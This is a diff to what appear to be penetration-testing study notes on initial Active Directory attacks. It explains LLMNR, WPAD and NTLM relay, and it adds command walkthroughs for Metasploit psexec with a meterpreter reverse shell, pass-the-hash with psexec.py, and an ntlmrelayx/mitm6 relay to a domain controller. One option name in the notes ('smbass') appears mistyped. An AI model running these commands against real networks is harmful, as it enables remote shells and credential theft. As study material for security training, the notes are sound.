@@ -11,6 +11,8 @@ description: Some initial attacks that can be performed on Active Directory
 * This stands for Link Local Multicast Name Resolution. It's former name was NBT-NS.
 * LLMNR helps to identify hosts when the DNS fails.
 * Its vulnerability comes from the fact that, when responded to correctly, it gives a user's username and a NTLMv2 hash in a MITM attack, which we may be able to crack to gain credentials.
+* WPAD (Web Proxy Auto-Discovery Protocol) automatically tells computers which web proxy to use on a network so Windows devices can discover them automatically. If Windows gets a response when it tries to look for WPAD, it assumes it's legitimate and connects automatically.
+* NTLM relay works by sending proof that the client machine you're impersonating knows the password hash live to the victim machine.&#x20;
 
 
 
@@ -145,7 +147,7 @@ SMB Relay Mitigation:
 
 
 
-Method:
+Method (using Metasploit):
 
 1. Start Metasploit Framework on Kali Linux and search for "psexec". Look for "exploit/windows/smb/psexec" or something along those lines.&#x20;
 2. Use it and set the payload to "windows/x64/meterpreter/reverse\_tcp". You could also replace x64 with x32 depending on the architecture of the target machine.&#x20;
@@ -154,3 +156,83 @@ Method:
 5. Set the SMB user to the user on the target machine.
 6. Set the SMB password for the user on the machine.&#x20;
 7. Run the command.&#x20;
+
+Extension (to do an NTLM/hash attack):
+
+1. Unset the subdomain:
+
+```
+msf6 exploit(windows/smb/psexec) > unset smbdomain
+```
+
+2. Set the local user you're on to Administrator:
+
+```
+msf6 exploit(windows/smb/psexec) > set smbuser administrator 
+```
+
+3. Set the password hash for the Administrator account:
+
+```
+msf6 exploit(windows/smb/psexec) > set smbass [hash]
+```
+
+4. Run the exploit.
+
+
+
+Method (using just psexec.py):
+
+1. Run this command in Kali:
+
+```bash
+root@kali:~# psexec.py [AD domain]/[username]:"[password]"@[target IP]
+```
+
+-> "psexec.py": uses SMB port 445 to attempt remote shell for remote code execution using valid admin credentials.&#x20;
+
+{% hint style="info" %}
+This method assumes you know the valid credentials, unhashed. If you don't know the unhashed password, look below.
+{% endhint %}
+
+{% hint style="info" %}
+If psexec.py is blocked or doesn't work, replace the "ps" part in the command with "wmi" or "smb" and see if that works.&#x20;
+{% endhint %}
+
+Extension (to attempt remote shell through only password hash):
+
+1. Run this command in Kali:
+
+```bash
+root@kali:~# psexec.py administrator@[target ip] -hashes [admin account password hash]
+```
+
+***
+
+## IPv6 Attacks:
+
+* This works because IPv6 may be turned on for machines in AD, but the machines may only be actually using IPv4.&#x20;
+* This means there's no one doing DNS services for IPv6. The attacker can thus listen to IPv6 traffic and receive traffic.
+* This can help to get authentication to the Domain Controller through SMB or LDAP. This can also help to get credentials in the form of NTLM as the attacker receives the IPv6 traffic.&#x20;
+
+
+
+Method (using MITM6):
+
+1. Set up NTLM Relay to get the credential hashes - relaying NTLM authentication:
+
+```bash
+root@kali:~# ntlmrelayx.py -6 -t ldaps://[Domain Controller IP] -wh fakewpad.[AD domain].local -l loot
+```
+
+-> "ntlmrelayx.py": runs the NTLM Relay X service.
+
+-> "-6": specifies IPv6 support to catch IPv6 authentication Windows didn't mean to send (because it mainly uses IPv4).
+
+-> "-t": specifies the target for the relay at ldaps://\[Domain Controller IP]. This is because NTLM relay to LDAPS can allow for modifying AD objects, adding users to groups etc. &#x20;
+
+-> "ldaps://\[Domain Controller IP]": using LDAP relay attacks the AD itself whereas an SMB relay from before would just attack a machine.&#x20;
+
+-> "-wh": sets up a fake WPAD host. Tells the tool to pretend to be a WPAD server for this domain name so when a Windows machine looks for WPAD, it receives a response from the attacker saying they are WPAD for Windows to automatically connect and initiate communication and trust the response. It then sends NTLM authentication automatically. From here, the authentication is relayed by the attacker to the DC over LDAPS.
+
+-> "-l loot": folder to store anything ntlmrelayx extracts is stored here.&#x20;
